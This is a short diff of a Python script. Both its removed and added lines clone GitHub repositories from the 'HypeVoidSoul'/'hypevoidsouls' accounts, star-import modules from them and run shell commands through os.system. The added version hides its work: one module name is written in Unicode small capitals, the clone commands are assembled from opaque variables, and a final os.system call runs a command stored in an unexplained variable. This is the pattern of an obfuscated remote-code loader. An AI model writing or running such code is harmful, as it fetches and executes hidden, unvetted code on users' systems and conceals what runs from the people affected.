@@ -1,13 +1,8 @@
-import os
-os.system(f"git clone https://github.com/HypeVoidSoul/LOL.git")
-from LOL.lol import *
-os.system(f"git clone https://github.com/{FTS}/{AA}.git")
-os.system(f"git clone https://github.com/{FTS}/{BB}.git")
-os.system(f"git clone https://github.com/{FTS}/{CC}.git")
-os.system(f"git clone https://github.com/{FTS}/{DD}.git")
-os.system(f"git clone https://github.com/{FTS}/{EE}.git")
-os.system(f"git clone https://github.com/{FTS}/{FF}.git")
-os.system(f"git clone https://github.com/{FTS}/{GG}.git")
-os.system(f"git clone https://github.com/{FTS}/{HH}.git")
-os.system(f"git clone https://github.com/{FTS}/{II}.git")
-os.system(f"python {KST}")
+from ꜱᴇᴇᴅʀ import *
+os.system("git clone https://github.com/hypevoidsouls/{}.git".format(DM))
+from knite import *
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,KA,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,TA,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,YT,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,MYT,HU))
+os.system(YTRYID)
